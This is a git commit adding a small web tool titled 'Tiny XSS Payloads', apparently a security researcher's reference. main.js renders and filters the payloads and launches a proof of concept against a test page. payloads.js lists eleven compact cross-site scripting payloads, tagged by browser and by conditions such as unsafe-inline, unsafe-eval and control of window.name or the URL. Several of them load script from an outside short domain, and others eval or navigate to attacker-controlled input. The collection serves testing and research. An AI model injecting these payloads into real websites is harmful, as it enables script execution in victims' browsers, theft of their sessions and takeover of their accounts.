efd033bf3e431394cd51bf3ac4b5ef7c9579c99e
terjanq <terjanq@gmail.com>
2020-07-10 00:19:40 +0200

    Tiny XSS Payloads

---
+++ main.js
@@ -0,0 +1,83 @@
+const checkboxesForm = document.getElementById('checkboxesForm');
+const payloadsDiv = document.getElementById("payloads")
+for(const tag of Object.values(TAGS)){
+    let checkbox = document.createElement('input');
+    checkbox.type = 'checkbox';
+    checkbox.checked = 1;
+    checkbox.id=tag;
+    checkboxesForm.appendChild(checkbox);
+
+    let label = document.createElement('label');
+    label.htmlFor=tag;
+    label.innerHTML=tag;
+    checkboxesForm.appendChild(label);
+    
+}
+
+function execute_payload(payload){
+    hash = `/*<iframe/onload="/*'/**/;alert(document.domain)//">`
+    let iframe = document.createElement('iframe');
+    x = open(`https://terjanq.ml/xss.php?html=${encodeURIComponent(payload.html)}#${hash}`, 'javascript:alert(document.domain)//')
+       
+}
+
+function createPayloads(payloads){
+    payloads.sort((x,y) => x.html.length - y.html.length)
+    for(let payload of payloads){
+        let div = document.createElement('div');
+        div.className = "payload";
+
+        let pre = document.createElement('pre');
+        let code = document.createElement('code')
+        pre.appendChild(code)
+        div.appendChild(pre)
+
+        code.innerText = payload.html;
+        code.classList.add('xml', 'hljs');
+
+        hljs.highlightBlock(code);
+
+        let counter = document.createElement('span');
+        counter.className = 'counter';
+        counter.innerText = payload.html.length;
+        div.appendChild(counter);
+
+        let poc = document.createElement('span');
+        poc.className = 'poc';
+        div.appendChild(poc);
+
+        poc.onclick = _ => execute_payload(payload)
+        for(let tag of payload.tags){
+            let span = document.createElement('span');
+            span.className = "tag";
+            span.innerText = tag;
+            div.appendChild(span)
+        }
+        payloadsDiv.appendChild(div)
+    }
+    
+}
+
+function process(e){
+    payloadsDiv.innerHTML = '';
+
+    const checkboxes = checkboxesForm.querySelectorAll('input[type=checkbox]')
+    let tags = []
+    for(let checkbox of checkboxes){
+        if(checkbox.checked){
+            tags.push(checkbox.id)
+        }
+    }
+
+    let payloads = []
+
+    for(const payload of PAYLOADS){
+        if(payload.tags.every(t=>tags.includes(t))){
+            payloads.push(payload)
+        }
+    }
+    
+    createPayloads(payloads);
+}
+
+process()
---
+++ payloads.js
@@ -0,0 +1,71 @@
+const TAGS = {
+    chrome: 'chromium',
+    firefox: 'firefox',
+    safari: 'safari',
+    unsafeInline: 'unsafe-inline',
+    unsafeEval: 'unsafe-eval',
+    scripts: 'external-scripts',
+    iframes: 'external-iframes',
+    controlsLength: 'controls-index-of-iframe',
+    controlsName: 'controls-name',
+    controlsURL: 'controls-URL',
+    notInner: 'not-innerHTML'
+}
+
+const PAYLOADS = [
+    {
+        html: '<script/src=//Ǌ.₨><\/script>',
+        tags: [TAGS.scripts, TAGS.notInner],
+        author: null,
+    },
+    {
+        html: '<iframe/onload=src=top.name>',
+        tags: [TAGS.unsafeInline, TAGS.controlsName],
+        author: '@terjanq'
+    },
+    {
+        html: '<iframe/onload=src=top[0].name+/\\Ǌ.₨/>',
+        tags: [TAGS.iframes, TAGS.unsafeInline, TAGS.controlsLength],
+        author: '@terjanq'
+    },
+    {
+        html: '<iframe/onload=src=contentWindow.name+/\\Ǌ.₨/>',
+        tags: [TAGS.iframes, TAGS.unsafeInline],
+        author: '@terjanq'
+    },
+    {
+        html: '<iframe/srcdoc="<script/src=//Ǌ.₨><\/script>">',
+        tags: [TAGS.scripts],
+        author: null,
+    },
+    {
+        html: '<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">',
+        tags: [TAGS.firefox, TAGS.scripts],
+        author: null,
+    },
+    {
+        html: "<iframe/onload=eval(`'`+URL)>",
+        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL],
+        author: '@wcbowling'
+    },
+    {
+        html: "<iframe/onload=write(URL)>",
+        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL],
+        author: '@kinugawamasato'
+    },
+    {
+        html: "<svg/onload=eval(name)>",
+        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName],
+        author: null,
+    },
+    {
+        html: "<svg/onload=eval(`'`+URL)>",
+        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL],
+        author: '@wcbowling'
+    },
+    {
+        html: "<svg/onload=location=name>",
+        tags: [TAGS.firefox, TAGS.unsafeInline, TAGS.controlsName],
+        author: null
+    }
+]
